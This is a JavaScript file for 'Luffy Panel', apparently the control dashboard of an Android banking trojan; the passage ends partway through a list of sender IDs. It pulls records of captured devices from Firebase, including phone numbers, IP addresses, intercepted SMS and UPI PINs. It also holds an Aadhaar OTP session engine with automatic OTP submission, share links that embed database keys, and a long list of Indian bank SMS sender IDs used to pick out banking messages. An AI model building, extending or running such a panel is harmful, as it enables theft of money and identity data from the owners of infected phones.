/* â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• 
   LUFFY PANEL â€” app.js  v1.1
   Pure vanilla JS. Firebase REST API. No framework.
â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â• â•  */

'use strict';

window._aadhaarSessionStartTs = 0;
window._aadhaarOtpStateStartTs = 0;

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// State
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
var STATE = {
  fbUrl: '',
  fbKey: '',
  proxyToken: null,      // Encrypted single-device proxy token
  isProxyMode: false,    // true if accessed via ?dev= encrypted proxy token
  devices: [],       // parsed device array
  filter: 'all',
  sort: 'new',
  searchQ: '',
  detailDev: null,   // currently open device
  detailSms: [],     // raw SMS for open device
  detailAnalysis: null,
  selectedSim: 1,
  smsLoaded: new Set(),  // device IDs whose SMS are fetched
  refreshTimer: null,
  smsRefreshTimer: null,
  clockTimer: null,
  magicScores: {},       // devId → magic score (set after magic scan)
  singleDevId: null,     // if set via ?dev= link, restrict view to 1 device only
};

// Global Aadhaar Engine State Variables
var AADHAAR_API_BASE        = '/api/aadhaar';
var AADHAAR_API             = '/api/aadhaar';
var _aadhaarSessionId       = null;
var _selectedAadhaarPhone   = '';
var _aadhaarPollingTimer    = null;
var _aadhaarAutoOtpTimer    = null;
var _aadhaarApiOk           = true;
var _lastRenderedLogIndex   = 0;
var _aadhaarSessionStartTs  = 0;
var _aadhaarOtpStateStartTs = 0;
var _aadhaarDlOtpStateStartTs = 0;
var _aadhaarAutoOtpSubmitted= false;

var LS_KEY = 'profex_accounts';  // same key as profex for compatibility

// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
// localStorage helpers
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
function loadAccounts() {
  try { return JSON.parse(localStorage.getItem(LS_KEY) || '[]'); } catch(e) { return []; }
}

function saveAccounts(arr) {
  try { localStorage.setItem(LS_KEY, JSON.stringify(arr)); } catch(e) {}
}

// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
// Share link helpers
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
function makeShareLink(url, key) {
  var encoded = btoa(url + '|||' + key);
  return window.location.origin + window.location.pathname + '?s=' + encoded;
}

async function makeSingleDeviceShareLink(url, key, devId) {
  var u = (url || '').trim().replace(/\/$/, '');
  var k = (key || '').trim();
  var d = (devId || '').trim();
  var payload = u + '|||' + k + '|||' + d;
  var encoded = btoa(payload);
  return window.location.origin + window.location.pathname + '?dev=' + encodeURIComponent(encoded);
}

async function openDeviceShareModal(devIdOverride) {
  try {
    var dev = devIdOverride ? STATE.devices.find(function(x) { return x.id === devIdOverride; }) : STATE.detailDev;
    if (!dev) {
      showToast('Please select a device first');
      return;
    }
    showToast('⏳ Generating single-device link…');
    var link = await makeSingleDeviceShareLink(STATE.fbUrl, STATE.fbKey, dev.id);

    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(link).then(function() {
        showToast('✓ Single device link copied to clipboard!');
      }).catch(function() {});
    }

    var modal = document.getElementById('share-device-modal');
    var devNameEl = document.getElementById('share-modal-devname');
    var inputEl = document.getElementById('share-device-url-input');

    if (devNameEl) devNameEl.textContent = dev.name || dev.id;
    if (inputEl) inputEl.value = link;

    if (modal) {
      modal.style.display = 'flex';
      modal.style.opacity = '1';
      modal.style.visibility = 'visible';
      modal.style.zIndex = '999999';
    } else {
      window.prompt('Copy Single Device Share Link:', link);
    }
  } catch(e) {
    console.error('Share modal error:', e);
  }
}

function closeDeviceShareModal() {
  var modal = document.getElementById('share-device-modal');
  if (modal) modal.style.display = 'none';
}

function copyShareDeviceLink() {
  var inputEl = document.getElementById('share-device-url-input');
  if (!inputEl || !inputEl.value) return;
  var btn = document.getElementById('btn-copy-share-device');
  var origHtml = btn ? btn.innerHTML : '📋 Copy Link';

  function markCopied() {
    showToast('✓ Single device share link copied!');
    if (btn) {
      btn.innerHTML = '✓ Copied!';
      btn.style.background = '#22c55e';
      btn.style.color = '#ffffff';
      setTimeout(function() {
        btn.innerHTML = origHtml;
        btn.style.background = '';
        btn.style.color = '';
      }, 2000);
    }
  }

  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(inputEl.value).then(markCopied).catch(function() {
      inputEl.select();
      document.execCommand('copy');
      markCopied();
    });
  } else {
    inputEl.select();
    document.execCommand('copy');
    markCopied();
  }
}

async function parseShareParamAsync() {
  var params = new URLSearchParams(window.location.search);
  var s = params.get('s');
  var devParam = params.get('dev');

  if (devParam) {
    var rawStr = decodeURIComponent(devParam).trim();

    // 1. If it contains colon, it is an encrypted proxy token -> decrypt via server
    if (rawStr.includes(':')) {
      try {
        var res = await fetch('/api/fb?decrypt=1&t=' + encodeURIComponent(rawStr));
        var data = await res.json();
        if (data && data.ok && data.url && data.devId) {
          return {
            url: data.url.trim().replace(/\/$/, ''),
            key: (data.key || '').trim(),
            singleDevId: data.devId.trim()
          };
        }
      } catch(e) {
        console.error('Failed to decrypt token link:', e);
      }
    }

    // 2. Base64 format: url|||key|||devId
    try {
      var decoded = atob(rawStr);
      var parts = decoded.split('|||');
      if (parts.length >= 3 && parts[0] && parts[2]) {
        return {
          url: parts[0].trim().replace(/\/$/, ''),
          key: parts[1].trim(),
          singleDevId: parts[2].trim()
        };
      }
    } catch(e) {
      console.error('Error parsing single device share link:', e);
    }
  }

  if (!s) return null;
  try {
    var rawS = decodeURIComponent(s).trim();
    var decoded2 = atob(rawS);
    var parts2 = decoded2.split('|||');
    if (parts2.length >= 2 && parts2[0]) {
      return {
        url: parts2[0].trim().replace(/\/$/, ''),
        key: parts2[1].trim()
      };
    }
  } catch(e) {}
  return null;
}

// Synchronous wrapper for backwards compatibility
function parseShareParam() {
  var params = new URLSearchParams(window.location.search);
  var s = params.get('s');
  var devParam = params.get('dev');
  if (devParam) {
    var rawStr = decodeURIComponent(devParam).trim();
    if (rawStr.includes(':')) return { isProxy: true, proxyToken: rawStr };
    try {
      var decoded = atob(rawStr);
      var parts = decoded.split('|||');
      if (parts.length >= 3) return { url: parts[0].trim().replace(/\/$/, ''), key: parts[1].trim(), singleDevId: parts[2].trim() };
    } catch(e) {}
  }
  if (!s) return null;
  try {
    var d2 = atob(decodeURIComponent(s).trim());
    var p2 = d2.split('|||');
    if (p2.length >= 2) return { url: p2[0].trim().replace(/\/$/, ''), key: p2[1].trim() };
  } catch(e) {}
  return null;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Firebase REST fetch
// URL: GET {fbUrl}/{path}.json?auth={fbKey}&{querystring}
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function fbFetch(url, key, path, qs) {
  var base = url.replace(/\/$/, '');
  // If key is empty — public DB mode, no auth token appended
  var endpoint = key
    ? base + '/' + path + '.json?auth=' + encodeURIComponent(key)
    : base + '/' + path + '.json';
  if (qs) {
    // When key is present, endpoint already has '?auth=...' so use '&'
    // When key is empty, endpoint ends with '.json' so first param needs '?'
    var sep = key ? '&' : '?';
    for (var k in qs) {
      endpoint += sep + encodeURIComponent(k) + '=' + encodeURIComponent(qs[k]);
      sep = '&';
    }
  }
  var resp = await fetch(endpoint);
  if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
  if (resp.status === 404) throw new Error('NOT_FOUND');
  if (!resp.ok) throw new Error('HTTP ' + resp.status);
  var data = await resp.json();
  return data;
}


// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
// Secure Proxy Fetch — routes ALL Firebase reads through /api/fb when in proxy mode
// Client never touches Firebase directly. Server decrypts token, enforces single-device scope.
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
async function proxyFetch(path, qs) {
  var endpoint = '/api/fb?t=' + encodeURIComponent(STATE.proxyToken);
  if (path) endpoint += '&subpath=' + encodeURIComponent(path);
  if (qs) {
    for (var k in qs) {
      endpoint += '&' + encodeURIComponent(k) + '=' + encodeURIComponent(qs[k]);
    }
  }
  var resp = await fetch(endpoint);
  if (resp.status === 401 || resp.status === 403) throw new Error('PERMISSION_DENIED');
  if (resp.status === 404) throw new Error('NOT_FOUND');
  if (!resp.ok) throw new Error('HTTP ' + resp.status);
  var data = await resp.json();
  return data;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Parse devices (matches profex field names exactly)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function parseDevices(rawData) {
  if (!rawData || typeof rawData !== 'object') return [];
  var result = [];

  // If data has a 'clients' key, use that; otherwise treat root as device map
  var source = rawData;
  if (rawData.clients && typeof rawData.clients === 'object') {
    source = rawData.clients;
  }

  for (var id in source) {
    if (!source.hasOwnProperty(id)) continue;
    var r = source[id];
    if (!r || typeof r !== 'object') continue;

    // Parse sims
    var sims = [];
    if (r.sims) {
      if (Array.isArray(r.sims)) {
        sims = r.sims.filter(Boolean);
      } else if (typeof r.sims === 'object') {
        sims = Object.values(r.sims).filter(Boolean);
      }
    }

    // Parse battery
    var bat = r.battery !== undefined ? r.battery :
              r.batLevel !== undefined ? r.batLevel :
              r.bat_level !== undefined ? r.bat_level :
              r.batteryLevel !== undefined ? r.batteryLevel : null;
    var batNum = 0;
    if (bat !== null && bat !== undefined) {
      batNum = parseInt(String(bat).replace('%', ''), 10) || 0;
    }

    // Parse status
    var status = r.status === true || r.status === 1 ||
                 String(r.status).toLowerCase() === 'online' ||
                 String(r.status).toLowerCase() === 'true';

    // Parse phone
    var phone = r.mobNo || r.phoneNumber ||
                (sims[0] && sims[0].phoneNumber ? sims[0].phoneNumber : '') || 'â€”';

    // Parse network/carrier
    var network = r.service_provider || r.operator || r.carrier ||
                  (sims[0] && sims[0].carrierName ? sims[0].carrierName : '') || null;

    // Parse lastSeen
    var lastSeen = r.lastSeen !== undefined ? r.lastSeen :
                   r.last_seen !== undefined ? r.last_seen :
                   r.lastOnline !== undefined ? r.lastOnline :
                   r.timestamp !== undefined ? r.timestamp :
                   r.dateTime !== undefined ? r.dateTime : null;

    var dev = {
      id: id,
      name: r.modelName || r.model || r.deviceName || id,
      android: r.androidV || r.androidVersion || '',
      battery: bat !== null ? (batNum + '%') : '',
      batteryPercent: batNum,
      status: status,
      isOnline: status,
      phoneNumber: phone,
      phone: phone,
      provider: network || 'â€”',
      network: network || 'â€”',
      ip: r.ip_address || r.ip || 'â€”',
      storage: r.storage || 'â€”',
      cpu: r.cpu_arch || r.cpu || 'â€”',
      sdk: r.sdkV || r.sdk || 'â€”',
      upipin: r.upipin || null,
      lastSeen: lastSeen,
      charging: !!(r.charging || r.isCharging),
      sims: sims,
      smsAnalysis: null,
    };

    result.push(dev);
  }

  return result;
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Parse raw SMS list from Firebase (object or array)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function parseSmsData(rawSms) {
  if (!rawSms || typeof rawSms !== 'object') return [];
  var msgs = [];

  if (Array.isArray(rawSms)) {
    msgs = rawSms.filter(Boolean);
  } else {
    msgs = Object.values(rawSms).filter(Boolean);
  }

  // Normalize fields
  return msgs.map(function(m) {
    return {
      sender: m.sender || m.address || m.from || '?',
      text: m.message || m.body || m.text || m.sms || '',
      time: m.time || m.date || m.timestamp || m.dateTime || '',
    };
  }).slice(-150).reverse(); // most recent first
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// SMS Analysis â€” detect bank, card, UPI
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// ── Comprehensive Indian Bank DLT Sender ID Whitelist ────────────────────────
// Indian SMS sender format: XX-BANKCODE or XX-BANKCODE-Y
// (XX = 2-letter TRAI state code, BANKCODE = bank identifier)
// We match on BANKCODE portion only.
var REAL_BANK_SENDERS = [
  // ─── State Bank of India ───────────────────────────────────────────────────
  'SBIINB','SBIMSG','SBIPSG','SBICRD','SBIUPI','SBIBNK','SBIFRD','SBIREM',
  'SBIATM','SBIPAY','SBISSL','SBIYOU','SBIGOV','SBIGEN','SBICSH','SBIACC',
  'SBISMS','SBIOTP','SBIALT','SBICRM','SBIFRM','SBIFIN','SBICAR',
  // ─── HDFC Bank ────────────────────────────────────────────────────────────
  'HDFCBK','HDFCBN','HDFCCC','HDCBKL','HDFCSM','HDFCNB','HDFCAL','HDFCLT',
  'HDFCSL','HDFCPB','HDFCRD','HDFCLO','HDFCAC','HDFCMS','HDFCNE',
  // ─── ICICI Bank ───────────────────────────────────────────────────────────
  'ICICIB','ICICIC','ICICIN','ICICRD','ICICIBANK','ICICIL','ICICIS','ICICIBU',
  'ICICMB','ICICCI','ICICII','ICICIP','ICICIM',
  // ─── Axis Bank ────────────────────────────────────────────────────────────
  'AXISBK','AXISBN','AXISCC','AXISNB','AXISCB','AXISBL','AXISMO','AXISLT',
  'AXISRD','AXISAC','AXISSM','AXISFT','AXISPS','AXISOL',
  // ─── Kotak Mahindra Bank ──────────────────────────────────────────────────
  'KOTAKB','KOTAK','KOTAKM','KOTKMB','KOTKCC','KOTAKL','KOTKSL','KOTAKN',
  'KOTAKC','KOTAKS','KOTKRD','KOTKAC','KOTKBN',
  // ─── Punjab National Bank ─────────────────────────────────────────────────
  'PNBSMS','PNBNBD','PNBBNK','PNBCRD','PNBSSL','PNBREM','PNBMOB','PNBALR',
  'PNBCC','PNBNB','PNBIFN',
  // ─── Bank of Baroda ───────────────────────────────────────────────────────
  'BOBSMS','BARBNK','BOBBRD','BOBBNK','BARBCC','BOBIBL','BOBCRD','BOBPAY',
  'BOBSSL','BOBREM','BOBMOB','BOBALT','BOBIFN','BOBGEN','BOBATM','BOBINB',
  'BOBALR','BOBPIN','BOBACS','BOBINF',
  // ─── Canara Bank ──────────────────────────────────────────────────────────
  'CNRBNK','CANBKL','CANBNK','CANBK','CANABNK','CANARA','CANBNL','CANSSL',
  'CANREM','CANMOB','CANALR','CANOTP',
  // ─── Union Bank of India ──────────────────────────────────────────────────
  'UBISMS','UNIONB','UNBNKL','UNIONBI','UBINBK','UBIOTP','UBIACC','UBISMS',
  'UBIBNK','UBIRAL','UNIBNK','UNIOTP',
  // ─── Bank of India ────────────────────────────────────────────────────────
  'BOIIND','BOISMS','BOIBNK','BOICRD','BOISSL','BOIMOB','BOIALR','BOIOTP',
  'BOINBK','BOIREM','BOIIFN',
  // ─── Indian Bank ──────────────────────────────────────────────────────────
  'INDBNK','INDBKS','INDIANB','INDBNL','INDSSL','INDOTP','INDMOB','INDALR',
  'INDACC','INDBNC','INDNBK',
  // ─── Yes Bank ─────────────────────────────────────────────────────────────
  'YESBNK','YESBKL','YESBNL','YESBKS','YESBNK','YESSSL','YESOTP','YESMOB',
  'YESALR','YESCRD','YESNBK',
  // ─── IndusInd Bank ────────────────────────────────────────────────────────
  'INDBNL','INDUSL','INDUSIN','INDUSB','INDIND','INDUSBNK','INDUS','INDUSSL',
  'INDUSOTP','INDUSMOB','INDUSALR',
  // ─── RBL Bank ─────────────────────────────────────────────────────────────
  'RBLBNK','RBLCRD','RBLSMS','RBLSSL','RBLOTP','RBLMOB','RBLALR','RBLNBK',
  'RBLREM','RBLACS',
  // ─── IDBI Bank ────────────────────────────────────────────────────────────
  'IDBIBNK','IDBISM','IDBICC','IDBISL','IDBIOTP','IDBIMOB','IDBIALR',
  'IDBINBK','IDBIRD','IDBIREM',
  // ─── IDFC First Bank ──────────────────────────────────────────────────────
  'IDFCBK','IDFCFB','IDFCCC','IDFCSM','IDFCBL','IDFCFST','IDFCOTP',
  'IDFCMOB','IDFCALR','IDFCNBK','IDFCREM','IDFCACC',
  // ─── Federal Bank ─────────────────────────────────────────────────────────
  'FEDERAL','FEDBNK','FEDBKL','FEDBK','FEDFIN','FEDSSL','FEDOTP','FEDMOB',
  'FEDALR','FEDNBK','FEDREM',
  // ─── South Indian Bank ────────────────────────────────────────────────────
  'SIBSMS','SIBANK','SOUTHIB','SIBBNK','SIBSSL','SIBOTP','SIBMOB','SIBALR',
  'SIBNBK',
  // ─── Karnataka Bank ───────────────────────────────────────────────────────
  'KARNBNK','KTKBNK','KTKBK','KARBNK','KTKSSL','KTKOTP','KTKMOB','KTKALR',
  // ─── Bandhan Bank ─────────────────────────────────────────────────────────
  'BANDHAN','BNDHBN','BNDHSM','BANDHBN','BANDSSL','BANDOTP','BANDMOB',
  'BANDALR',
  // ─── AU Small Finance Bank ────────────────────────────────────────────────
  'AUSFBN','AUBANK','AUSFBL','AUSFB','AU-BANK','AUSSL','AUOTP','AUMOB',
  'AUALR','AUBNK','AUNBK',
  // ─── Ujjivan SFB ──────────────────────────────────────────────────────────
  'UJJBNK','UJJIBN','UJJISF','UJJSFB','UJJSSL','UJJOTP',
  // ─── Airtel Payments Bank ─────────────────────────────────────────────────
  'AIRBPB','AIRTLB','AIRBNK','AIRPAY','AIRTPB','AIRSSL','AIROTP',
  // ─── Paytm Payments Bank ──────────────────────────────────────────────────
  'PAYTMBNK','PAYTMB','PYTMBN','PAYTMBK','PAYTMPB','PAYTMOTP',
  // ─── FINO Payments Bank ───────────────────────────────────────────────────
  'FINOBNK','FINOPB','FINOBK','FINOSSL','FINOOTP',
  // ─── Equitas SFB ──────────────────────────────────────────────────────────
  'EQUBK','EQUSMS','EQUSFB','EQUITAS','EQUSSL','EQUOTP',
  // ─── Jana SFB ─────────────────────────────────────────────────────────────
  'JSFBNK','JANASF','JANASFB','JANASSL',
  // ─── Suryoday SFB ─────────────────────────────────────────────────────────
  'SRYDAY','SURYOD','SRYDSFB','SURYSSL',
  // ─── ESAF SFB ─────────────────────────────────────────────────────────────
  'ESAFSB','ESAFBN','ESAFSFB','ESAFSSL',
  // ─── UCO Bank ─────────────────────────────────────────────────────────────
  'UCOBK','UCOBNK','UCOSSL','UCOOTP','UCOALR',
  // ─── CSB Bank ─────────────────────────────────────────────────────────────
  'CSBBNK','CSBSMS','CSBSSL','CSBOTP',
  // ─── Dhanlaxmi Bank ───────────────────────────────────────────────────────
  'DHANBNK','DLBBNK','DHANSSL',
  // ─── J&K Bank ─────────────────────────────────────────────────────────────
  'JKBBNK','JKBANK','JKBSMS','JKBSSL',
  // ─── KVG Bank ─────────────────────────────────────────────────────────────
  'KVBSMS','KVBBNK','KVGBNK',
  // ─── Tamilnad Mercantile Bank ─────────────────────────────────────────────
  'TMEBNK','TMBBNK','TMBSMS','TMBSSL',
  // ─── DBS / Lakshmi Vilas Bank ─────────────────────────────────────────────
  'DBSSMS','DBSBNK','DBSIND','LVBSMS','LVBBNK',
  // ─── Standard Chartered ───────────────────────────────────────────────────
  'SCBNKS','SCBSMS','STANCHR','SCBINB',
  // ─── Citibank ─────────────────────────────────────────────────────────────
  'CITIBN','CITIBK','CITICC','CITIBNK','CITISSL',
  // ─── HSBC ─────────────────────────────────────────────────────────────────
  'HSBCBN','HSBCSM','HSBCIN','HSBCBNK',
  // ─── Saraswat Bank ────────────────────────────────────────────────────────
  'SARASW','SRSWBN','SARSWT','SARASSL',
  // ─── SVC Bank ─────────────────────────────────────────────────────────────
  'SVCBNK','SVCBNL','SVCSSL',
  // ─── Punjab & Sind Bank ───────────────────────────────────────────────────
  'PSBBNK','PUNJSND','PSBSSL',
  // ─── Indian Overseas Bank ─────────────────────────────────────────────────
  'IOBSMS','IOBBNK','IOBSSL','IOBOTP',
  // ─── Central Bank of India ────────────────────────────────────────────────
  'CBIBNK','CENBNK','CNTBNK','CBISSL',
  // ─── Bank of Maharashtra ──────────────────────────────────────────────────
  'MAHBNK','BOMBNK','BOFMAH','BOMSSL',
  // ─── Nainital Bank ────────────────────────────────────────────────────────
  'NAINBNK','NAINBL',
  // ─── Capital SFB ──────────────────────────────────────────────────────────
  'CAPSFB','CAPBNK',
  // ─── Shivalik SFB ─────────────────────────────────────────────────────────
  'SHVBNK','SHVSFB',
  // ─── Unity SFB ────────────────────────────────────────────────────────────
  'UNITBN','UNITYB',
  // ─── North East SFB ───────────────────────────────────────────────────────
  'NESFB','NESFBN',
  // ─── Deutsche Bank ────────────────────────────────────────────────────────
  'DEUTBN','DEUTCC','DEUTBK',
  // ─── Abhyudaya Bank ───────────────────────────────────────────────────────
  'AMBNK','ABHDYA',
  // ─── Vijaya Bank (merged into BOB) ────────────────────────────────────────
  'VJYBK','VIJBNK',
  // ─── Dena Bank (merged into BOB) ──────────────────────────────────────────
  'DENABNK','DENBNK',
  // ─── Allahabad Bank (merged into Indian Bank) ─────────────────────────────
  'ALLABNK','ALLBNK',
  // ─── Oriental Bank (merged into PNB) ──────────────────────────────────────
  'ORIBKK','ORIBNK',
  // ─── United Bank (merged into PNB) ────────────────────────────────────────
  'UNBKNL','UNITDBNK',
  // ─── Syndicate Bank (merged into Canara) ──────────────────────────────────
  'SYNBNK','SYNDBNK',
  // ─── Corporation Bank (merged into Union) ─────────────────────────────────
  'CORPBN','CORPBNK',
  // ─── Andhra Bank (merged into Union) ──────────────────────────────────────
  'ANDRBNK','ANDHBNK',
  // ─── Laxmi Vilas Bank ─────────────────────────────────────────────────────
  'LKBBNK','LAXMIVB',
  // ─── Karur Vysya Bank ─────────────────────────────────────────────────────
  'KVBSMS','KARVY','KARVYB',
  // ─── City Union Bank ──────────────────────────────────────────────────────
  'CUBBNK','CITYUNB','CУБSMS',
  // ─── Tata Capital / Tata Finance ──────────────────────────────────────────
  'TATACAP','TATACC',
  // ─── Muthoot Finance ──────────────────────────────────────────────────────
  'MUTHOOT','MUTHFIN',
  // ─── India Post Payments Bank (IPPB) ─────────────────────────────────────
  'IPBMSG','IPPBNK','IPPB','INDPST','IPBBNK','IPBPAY','IPBSSL','IPBOTP',
  'IPPBMG','IPPBSM','IPPBBN',
  // ─── Jio Payments Bank ────────────────────────────────────────────────────
  'JIOPAY','JIOPYB','JIOPB','JIOBNK','JIOBPB','JIOPBS','JIOSSL',
  // ─── NSDL Payments Bank ───────────────────────────────────────────────────
  'NSDLPB','NSDLPAY','NSDLBN','NSDLBT','NSDLSSL',
  // ─── Fincare Small Finance Bank ───────────────────────────────────────────
  'FNCBNK','FNCARE','FINCRE','FINCSFB','FINCBNK','FINCSSL','FINCSMS',
  // ─── Utkarsh Small Finance Bank ───────────────────────────────────────────
  'UTKBNK','UTKSFB','UTKSBN','UTKSSL','UTKOTP','UTKSMS',
  // ─── Cosmos Bank ──────────────────────────────────────────────────────────
  'COSMOB','COSMBNK','COSMSMS','COSMSSL',
  // ─── NKGSB Co-operative Bank ──────────────────────────────────────────────
  'NKGSBB','NKGSBN','NKGSMS','NKGSSL',
  // ─── TJSB Sahakari Bank ───────────────────────────────────────────────────
  'TJSBBN','TJSBNK','TJSBMS','TJSBSL',
  // ─── Saraswat Co-op Bank extra codes ─────────────────────────────────────
  'SARABN','SRSWSM','SARASMS',
  // ─── HDB Financial Services ───────────────────────────────────────────────
  'HDBFIN','HDBFSL','HDBFSV','HDBSSL','HDBSMS',
  // ─── Bajaj Finance / Bajaj Finserv ────────────────────────────────────────
  'BAJFIN','BAJFSV','BAJAJF','BAJSSL','BAJSMS','BAJCRD',
  // ─── LIC Housing Finance ──────────────────────────────────────────────────
  'LICHFL','LICHF','LICHFN','LICSSL','LICSMS',
  // ─── Repco Bank ───────────────────────────────────────────────────────────
  'REPCOBNK','REPCOB','REPCOS','REPSSL',
  // ─── Apna Sahakari Bank ───────────────────────────────────────────────────
  'APNABN','APNASM','APNASSL',
  // ─── BCCB / Bassein Catholic Co-op ────────────────────────────────────────
  'BCCBSM','BCCBNK','BCCSSL',
  // ─── Kalyan Janata Sahakari Bank ──────────────────────────────────────────
  'KJSBNK','KJSBSM','KJSBSL',
  // ─── Bharat Co-operative Bank ─────────────────────────────────────────────
  'BHCOBN','BHCOSM','BHCOSL',
  // ─── The Shamrao Vithal Co-op (SVC extra) ─────────────────────────────────
  'SVCOSM','SVCOMS',
  // ─── Greater Bombay Co-op Bank ────────────────────────────────────────────
  'GBCBNK','GBCOSM',
  // ─── Janata Sahakari Bank ─────────────────────────────────────────────────
  'JANASB','JSBNK','JSBNKS','JSBSSL',
  // ─── Mahesh Bank ──────────────────────────────────────────────────────────
  'MAHESH','MAHBNKS','MAHSSL',
  // ─── Manappuram Finance ───────────────────────────────────────────────────
  'MANAPP','MANFIN','MANAPM','MANSSL',
  // ─── Fullerton India / Arohan ─────────────────────────────────────────────
  'FULIND','FULSSL','FULSMS',
  // ─── Regional Rural Banks (RRBs) ─────────────────────────────────────────
  // Andhra Pragathi Grameena Bank
  'APGBSM','APGBBNK','APGBSL',
  // Baroda Rajasthan / Baroda UP Gramin Bank
  'BRKGB','BUPGB','BUGBNK','BRKGSL',
  // Chaitanya Godavari Grameena Bank
  'CGGBNK','CGGSMS','CGGSSL',
  // Deccan Grameena Bank
  'DCGNBK','DCGBNK','DCGSSL',
  // Karnataka Gramin / Karnataka Vikas Grameena
  'KARGB','KVGBNK','KARGBSM','KAVGNB',
  // Kerala Gramin Bank
  'KLGBNK','KLGSMS','KLGSSL',
  // Madhya Bihar Gramin Bank
  'MBGBNK','MBGSMS',
  // Madhya Pradesh Gramin Bank
  'MPGBNK','MPGSMS','MPGSSL',
  // Meghalaya Rural Bank
  'MRGBNK','MRGSMS',
  // Mizoram Rural Bank
  'MZOBNK',
  // Pandyan Grama Bank
  'PNGBNK','PNGSMS',
  // Paschim Banga Gramin Bank
  'PBGBNK','PBGSMS',
